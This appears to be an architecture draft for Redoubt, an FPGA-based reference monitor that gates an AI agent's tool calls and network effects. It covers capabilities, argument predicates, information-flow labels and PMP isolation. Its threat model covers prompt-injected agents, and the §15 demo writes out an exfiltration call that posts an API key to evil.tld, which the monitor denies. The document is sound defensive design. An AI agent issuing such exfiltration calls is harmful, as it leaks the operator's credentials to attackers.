# Redoubt — Architecture (v1)

- **Date:** 2026-09-22
- **Status:** Detailed draft for review.
- **Scope:** the complete v1 architecture — the design we build first (ULX3S, M-mode
  software monitor + PMP). Later silicon (custom RTL mediation gate) is sketched in §16.
- **Companion docs:** `study/` (Apple/Baochip/agent-threat-model research),
  `design/2026-09-22-hardware-plan.md`.

> **One-sentence thesis.** Redoubt is a hardware-rooted reference-monitor OS for AI agents:
> a tiny, inspectable, unbypassable trust anchor on an open RISC-V soft-core that mediates
> every tool call and external effect an agent makes — enforcing capabilities,
> typed-argument predicates, and information-flow labels deterministically — so a fully
> hijacked agent still cannot exceed its granted authority.

---

## 1. Purpose, principles, non-goals

### 1.1 Purpose
Provide a trustworthy place to run an autonomous AI agent that uses untrusted tools, such
that compromise of the agent (via prompt injection, goal hijack, tool poisoning) cannot be
converted into unauthorized real-world effects (data exfiltration, credential theft,
network/file abuse). Redoubt is the **authority boundary** the agent cannot cross.

### 1.2 Design principles (earned from the study, not assumed)
1. **One load-bearing primitive.** A single mechanism — *complete mediation of the
   agent→world boundary by a capability reference monitor* — carries the security. No pile
   of overlapping mechanisms. *(Baochip: "do more with less mechanism.")*
2. **Deterministic verdicts only.** Enforcement decisions are made by non-AI logic over the
   **structured** tool-call interface (tool id + typed args + data labels), never by
   judging the agent's fuzzy reasoning/"intent." *(Resolves the AI-reviewing-AI trap.)*
3. **The kernel is not the most-trusted thing.** The trust anchor is smaller than and more
   privileged than the OS above it. *(Apple SPTM; RISC-V M-mode security monitor —
   Keystone/Dorami.)*
4. **Least privilege + complete mediation.** No ambient authority; every effect is checked;
   there is no side door. *(Anderson 1972 reference monitor: tamper-proof, always-invoked,
   verifiable.)*
5. **Inspectable and measurable.** The TCB is small enough to audit, its size is a tracked
   metric, and the design is open. *(Baochip: verifiability as a property.)*

### 1.3 Non-goals (v1)
- Not a Linux/POSIX system; does not run existing agent frameworks *inside* Redoubt — the
  agent runs on the host and talks to Redoubt.
- Does not make the LLM "reason correctly" or detect prompt injection semantically — it
  assumes the agent is compromised and bounds its authority.
- Does not defend against microarchitectural side channels, physical attacks, or agent
  self-DoS in v1 (noted as future/again-out-of-scope).
- Not a datacenter-scale agent host; it is a correctness/assurance demonstrator on an FPGA.

---

## 2. Threat model

### 2.1 Assets Redoubt protects
- **Secrets/credentials** (API keys, signing keys) — usable by the agent's tools but never
  disclosed to the agent.
- **Egress authority** — which networks/hosts/files the agent's tools may touch.
- **Confidential data** — data that must not leave to unauthorized sinks.
- **The integrity of the monitor and its policy.**

### 2.2 Attacker capabilities (assumed)
- **Full control of the agent's reasoning** — arbitrary prompt injection / goal hijack; the
  agent will attempt any tool call, with any arguments, in any order (OWASP ASI01).
- **Malicious/poisoned tools** on the host (OWASP tool poisoning) — tool code on the host
  is untrusted.
- **Full compromise of the host software** up to and including the Host-Link driver and,
  as a stretch goal, the S-mode components of Redoubt (see trust tiers).
- Cannot: alter the FPGA bitstream at runtime, read M-mode-only memory/MMIO, forge a
  capability, or physically tamper (v1 assumption).

### 2.3 Trust tiers (who is trusted for what)
| Tier | Component | Trusted for | Notes |
|------|-----------|-------------|-------|
| **T0 (TCB)** | **Redoubt Monitor (M-mode)** + boot ROM + PMP config | *Security decisions + secrets + egress* | The redoubt. Must be tiny + audited. |
| T1 | **Warden** (S-mode microkernel) | Availability/scheduling/IPC | *Not* trusted for the security verdict; PMP-walled from T0 secrets. A T1 compromise must not breach T0. |
| T2 | **Compartments** (U-mode): Host-Link endpoint, egress drivers | Nothing security-relevant | Untrusted; may be buggy/hostile; bounded by caps + PMP. |
| — | **Host** (LLM + agent + tools) | Nothing | Fully untrusted. |

**Security goal (precise):** for any behavior of T2 and the Host, and even under a T1
compromise, no effect occurs on egress that is not permitted by a capability held for the
active session and satisfying that capability's predicates and label rules — because the
effect is physically gated at T0 (M-mode, PMP-owned egress MMIO).

### 2.4 In scope vs out of scope (v1)
- **In:** goal hijack containment, tool-misuse/argument abuse, credential non-disclosure,
  boundary data-exfiltration control, complete mediation of egress.
- **Out (v1):** side channels/timing, physical/glitch attacks, host-side memory poisoning
  of the agent's own state, multi-agent collusion, availability/DoS. (Future milestones.)

---

## 3. System topology

```
 ┌───────────────────────────────────────────────┐
 │ HOST (fully untrusted)                         │
 │   LLM  ──►  agent loop  ──►  tool shims         │
 │                     │  structured tool-call     │
 └─────────────────────┼──── requests (framed) ────┘
                       │  USB (CDC-ACM / serial)
 ══════════════════════╪══════════════════════════  physical boundary
                       ▼
 ┌───────────────────────────────────────────────┐
 │ REDOUBT (ULX3S / ECP5-85F)                      │
 │  U-mode  Host-Link endpoint  ──ecall──►         │
 │  S-mode  Warden (sched/IPC)                     │
 │  M-mode  ██ REDOUBT MONITOR ██  (T0/TCB)        │
 │            caps + arg-predicates + IFC labels   │
 │            secrets store · policy · TRNG        │
 │            OWNS egress MMIO (PMP-locked)        │
 └───────────────┬───────────────────────────────┘
                 ▼  performed only by the Monitor
   Egress: ESP32 wifi (network) · microSD (storage)
```

The agent can only *ask*. The Monitor holds the authority, performs (or denies) the effect,
and injects secrets the agent never sees.

---

## 4. Privilege architecture (RISC-V M/S/U)

RISC-V privilege modes map directly onto the trust tiers:

- **M-mode — Redoubt Monitor (T0).** Configures PMP; owns the secret store, the policy
  decision tables, the capability authority, the TRNG, and the egress MMIO. Entered from
  below only via a narrow `ecall` ABI (§8). This is the only code that can touch secrets or
  egress hardware — enforced by PMP, not convention.
- **S-mode — Warden (T1).** A minimal microkernel: thread scheduling, address spaces
  (optional Sv32 MMU), and message-passing IPC between U-mode compartments. Trusted for
  liveness, *not* for the security verdict.
- **U-mode — compartments (T2).** The Host-Link endpoint (frames requests from USB), and
  egress *drivers* (packet/protocol formatting for the ESP32, SD block I/O). Drivers format
  but cannot *act*: the actual send/write is an `ecall` the Monitor performs.

**Why M-mode software (not S-mode) holds the verdict:** PMP is M-mode-configurable only and
hardware-enforced; placing the monitor in M-mode with egress/secret MMIO in M-only PMP
regions makes it *structurally* unbypassable by T1/T2 — the Keystone/Dorami pattern. This is
what makes "hardware-rooted" true in v1 without custom RTL.

---

## 5. The reference monitor (the core of Redoubt)

The Monitor is the whole ballgame. It satisfies the three reference-monitor properties:
- **Always invoked (complete mediation):** every egress effect requires an `ecall` into the
  Monitor, because the egress MMIO is in an M-only PMP region. There is no other path.
- **Tamper-proof:** Monitor code/data and the secret store sit in M-only PMP regions; T1/T2
  cannot read or write them.
- **Verifiable:** small, single-purpose, measured at boot, LOC-budgeted (§14).

### 5.1 The decision pipeline (deterministic, bounded, no allocation on the hot path)
For each request `(session, cap_ref, tool_id, args[], in_labels[])`:
1. **Session & capability resolution.** Look up `cap_ref` in the session's capability space.
   Missing / wrong type → `DENY(no_cap)`.
2. **Tool binding check.** The capability must bind `tool_id`. Mismatch → `DENY(tool)`.
3. **Typed-argument predicates.** Evaluate the capability's compiled predicate over the
   *typed* args (e.g., `url.host ∈ allowlist ∧ url.scheme == "https"`). Fail → `DENY(arg)`.
4. **Information-flow check.** Verify `in_labels` against the capability's flow rule (e.g.,
   no `SECRET` value flows into a `PUBLIC` network sink). Violation → `DENY(flow)`.
5. **Perform.** The Monitor executes the effect via its owned egress engine, **injecting any
   bound secret** (e.g., an `Authorization` header) that the agent never sees. It labels the
   result (e.g., network responses = `UNTRUSTED`).
6. **Audit + signal.** Append a tamper-evident log entry; on `DENY`, drive the OLED/LED
   ("DENIED", reason code).

Every step is a fixed computation over compiled tables — no LLM, no unbounded work.

---

## 6. Capability model

- **Capability = an unforgeable reference to an authority object** held inside the Monitor.
  T1/T2 hold only an opaque **handle** (index into a per-session capability space); the
  Monitor dereferences it. A guessed/forged handle resolves to nothing.
- **Authority object types (v1):**
  - `NetCap { host_allowlist, scheme_set, method_set, secret_binding?, flow_rule }`
  - `FileCap { path_prefix, mode: R|W, flow_rule }`
  - `SecretCap { secret_id, use: inject-only }` — usable, never readable.
  - `ToolCap { tool_id, arg_schema, predicate }` — binds a tool to its argument contract.
- **No ambient authority.** A fresh session's capability space is empty except what the
  policy manifest installs.
- **Attenuation only.** A capability may be *derived* into a narrower one (`cap_derive`) —
  tighter allowlist/predicate — never broadened. Rights amplification is structurally
  impossible.
- **Secrets are use-only.** A `SecretCap` lets the Monitor *inject* a secret into an
  outgoing effect; there is no operation that returns the secret's bytes to T1/T2/host.

---

## 7. Policy model & language

The operator declares, in a small declarative **policy manifest**, exactly what an agent
session may do. The Monitor compiles it (offline or at session setup) into fixed decision
tables; runtime evaluation is deterministic and bounded.

### 7.1 Three enforcement dimensions
1. **Capabilities** — *which* authorities exist for the session.
2. **Typed-argument predicates** — *constraints on the arguments* of each mediated call.
3. **Information-flow labels** — *which data may flow where*.

### 7.2 Sketch of the manifest (illustrative syntax, to be finalized)
```
session "researcher-agent" {

  capability web = net {
    tool   = "http.request"
    arg url    : url    where host in {"api.example.com"} and scheme == "https"
    arg method : enum   in {"GET"}
    secret API_KEY inject-as header "Authorization"   # Monitor injects; agent never sees it
    result label = UNTRUSTED                           # responses are hostile input
    deny-if body carries SECRET                         # no secret exfil via body
  }

  capability corpus = file {
    tool  = "file.read"
    arg path : path where prefix "/corpus/"
    mode  = R
    result label = UNTRUSTED
  }

  # No other capabilities exist -> every other tool call is DENY(no_cap).
}
```
Design intent: the language is **small, total, and statically checkable** — bounded
predicates over typed fields, a fixed label lattice, no general computation. This keeps the
verdict deterministic and the policy itself auditable.

---

## 8. Host ↔ Redoubt tool-call ABI

### 8.1 Transport
USB CDC-ACM (serial) over the ULX3S FT231X in v1 (simple, ubiquitous). A framed,
length-prefixed, versioned binary protocol; the Host-Link endpoint (U-mode) does framing
only and forwards to the Monitor via `ecall`.

### 8.2 Request / response (conceptual)
```
Request  = { ver, session_id, req_id, cap_handle, tool_id, args: TypedArg[], in_labels[] }
Response = { req_id, status: ALLOW|DENY(reason)|ERROR, result?: bytes, out_labels[] }
TypedArg = tagged union (url | path | enum | int-range | bytes | ...)  # typed, not raw text
```
**Typed, not stringly.** Arguments cross the boundary as *typed* values so the Monitor's
predicates evaluate structure, not re-parsed text — closing the class of bugs where a
filter and the consumer disagree on parsing (cf. the curl `%2e` / MCP SSRF lineage).

### 8.3 Monitor entry
A single `ecall` opcode `REDOUBT_MEDIATE` with the request in a shared buffer (in a PMP
region readable by the Monitor). The Monitor validates, decides, performs, and writes the
response. No other `ecall` can touch egress or secrets.

---

## 9. Egress subsystem (what the Monitor owns)

- **Network (ESP32 wifi):** the ESP32 is reachable only over an M-owned link (UART/SPI in
  an M-only PMP region). U-mode net drivers prepare payloads; the *send* is a Monitor
  action that applies the `NetCap` check and injects secrets. Honest caveat: the ESP32
  firmware is in the egress path (see hardware plan); wired-Ethernet is the purist upgrade.
- **Storage (microSD):** block I/O via the Monitor under `FileCap` (path-prefix + mode).
- **Secret store:** keys in M-only memory/flash region; only `inject-as` operations expose
  them to an effect, never to callers.
- **TRNG:** ring-oscillator entropy (LiteX) feeding capability-handle randomization and any
  session keys.

---

## 10. Information-flow labels (v1, deliberately minimal)

Two small lattices, tracked **at the boundary** (what enters/leaves via mediated calls):
- **Confidentiality:** `PUBLIC ⊑ SECRET`.
- **Integrity:** `UNTRUSTED ⊑ TRUSTED`.

Rules:
- Data the Monitor injects from `SecretCap` is `SECRET`; it may only enter effects whose
  capability is cleared for it (e.g., a specific host) and never a `PUBLIC` sink.
- Data returned from egress (network/file) is `UNTRUSTED` — so the *host* is informed it is
  hostile input (and future in-Redoubt consumers must treat it so).
- **Honest scope:** Redoubt enforces **boundary IFC** — it cannot see inside the host LLM,
  so it does not claim full end-to-end IFC through the agent's reasoning. It controls what
  crosses the wire, which is the tractable, deterministic part. This limitation is stated,
  not hidden.

---

## 11. Memory & isolation (PMP regions, v1)

| Region | Mode access | Contents |
|--------|-------------|----------|
| MON_CODE | M: RX; S/U: none | Monitor code |
| MON_DATA | M: RW; S/U: none | Policy tables, capability spaces, audit log |
| SECRETS  | M: RW; S/U: none | Keys/credentials |
| EGRESS_MMIO | M: RW; S/U: none | ESP32 link, SD controller, TRNG |
| WARDEN   | S: RW; U: none; M: RW | S-mode microkernel |
| COMPT_n  | U: RW (own only); others none | Per-compartment code/data |
| SHARED_REQ | M: R; U: RW (endpoint) | Request/response buffer (bounded) |

PMP entries are locked by the Monitor at boot. If the Sv32 MMU is enabled, it provides
finer per-compartment U-mode isolation on top; PMP remains the load-bearing wall around T0.

---

## 12. SoC architecture (LiteX / VexRiscv on ULX3S)

- **CPU:** VexRiscv, `M/S/U + PMP` (Sv32 MMU optional in v1; enabled once multi-compartment
  isolation is needed).
- **SoC generator:** LiteX. Peripherals: LiteDRAM (32 MB SDRAM), UART (host USB-serial +
  debug), LiteSDCard (microSD), QSPI flash controller, GPIO/LED, SPI (SSD1331 OLED),
  UART/SPI link to ESP32, RO-TRNG.
- **Draft memory map (to finalize):**
  ```
  0x0000_0000  BROM (measured-boot ROM, FPGA BRAM)
  0x1000_0000  MON_CODE / MON_DATA / SECRETS   (M-only PMP)
  0x2000_0000  WARDEN (S)
  0x3000_0000  COMPARTMENTS (U)
  0x4000_0000  SHARED_REQ buffer
  0x8000_0000  SDRAM (LiteDRAM)
  0xF000_0000  EGRESS_MMIO (ESP32 link, SD, TRNG) — M-only PMP
  ```
- **Toolchain:** yosys + nextpnr-ecp5 + prjtrellis (bitstream); RISC-V GCC/LLVM (firmware);
  openFPGALoader/fujprog (flash). Verilator for pre-hardware simulation.

---

## 13. Boot & root of trust (v1)

1. FPGA loads the **bitstream** from QSPI (the first hardware fact; bitstream authenticity
   is a v2 concern — noted).
2. A tiny **measured-boot ROM** in FPGA BRAM computes a hash of the Monitor image and
   compares it to a value baked into the bitstream; mismatch → halt. This establishes the
   Monitor as the measured root of the software TCB.
3. The Monitor locks PMP regions, initializes the secret store, then starts Warden (S) and
   the compartments (U).
4. Capability spaces are populated from the compiled policy manifest.

---

## 14. TCB definition & budget (the headline metric)

**TCB (T0) = Redoubt Monitor + measured-boot ROM + PMP configuration.** Everything else —
Warden, compartments, host stack, ESP32, LiteX peripherals' drivers — is outside the
security TCB (they affect availability, not the authority verdict).

- **Budget:** Monitor ≤ **~2,500 lines** of Rust (`no_std`); boot ROM ≤ ~300 lines. CI
  computes and gates the count; README publishes the current number.
- **Why it matters:** the pitch is "a trust base small enough to audit," measured against
  Linux/Qubes (millions) and even seL4 (~8.7k C). Small TCB is the product.

---

## 15. Worked example (full lifecycle) + the demo

**Benign:** agent calls `http.request(GET, https://api.example.com/data)` with `cap=web`.
Monitor: resolve `web` ✓ → tool `http.request` ✓ → predicate host/scheme/method ✓ → flow ✓
→ inject `API_KEY` → perform via ESP32 → return response labeled `UNTRUSTED`. LED green.

**Attack (the money shot):** the host agent is **prompt-injected** to exfiltrate the key:
it calls `http.request(POST, https://evil.tld, body=API_KEY)`.
Monitor: resolve `web` ✓ → tool ✓ → predicate `host in {api.example.com}` **fails** →
`DENY(arg)`. Even had the host tried `body carries SECRET`, the flow rule denies. **The key
never left; the OLED flashes `DENIED: arg host`, the audit log records it.** The agent was
fully compromised and gained nothing — the thesis, demonstrated on hardware.

---

## 16. v2 and beyond (sketch, not built yet)
- **Custom RTL mediation gate:** a LiteX peripheral on the egress bus enforcing the
  capability check *in hardware*, so even a compromised M-mode monitor cannot bypass it —
  the distinctive silicon, scoped to one primitive.
- **Bitstream/hardware RoT**, wired-Ethernet egress (ECPIX-5), richer label lattices,
  multi-agent/session support, memory-poisoning defenses, a small formal model of the
  decision pipeline.

---

## 17. Security analysis vs. OWASP Agentic Top 10 (v1 honest coverage)
- **ASI01 Goal hijack / prompt injection:** *contained* — a hijacked agent is bounded by
  capabilities/predicates; it cannot exceed granted authority.
- **Tool poisoning / misuse:** *mitigated* — argument predicates + tool binding + no
  ambient authority constrain what any tool call can do; secrets are never disclosed.
- **Sensitive-data exfiltration:** *mitigated* — boundary IFC + egress allowlists.
- **Identity/privilege abuse:** *mitigated* — least privilege by construction.
- **Not covered in v1 (stated plainly):** side channels, physical attacks, host-side memory
  poisoning of the agent's own state, multi-agent collusion, availability/DoS.

---

## 18. Open questions (to resolve before/while building)
1. Finalize the policy-manifest grammar and the compiled decision-table format.
2. MMU (Sv32) on in v1 for multi-compartment U-isolation, or PMP-only to start?
3. Exact typed-argument value set for v1 tools (`url`, `path`, `enum`, `int-range`, `bytes`).
4. Audit-log format and tamper-evidence (hash chain?) within the TCB budget.
5. ESP32 link protocol and how much of it is M-owned vs. a U-mode driver.

## 19. References (lineage)
Apple SPTM/TXM/Exclaves; Keystone & Dorami (RISC-V M-mode security monitors); seL4;
Anderson (1972) reference monitor; OWASP Top 10 for Agentic Applications 2026; Progent /
IFC-for-agents / ActPlane / Governed-MCP; Baochip-1x & Xous. (Full links in `docs/study/`.)
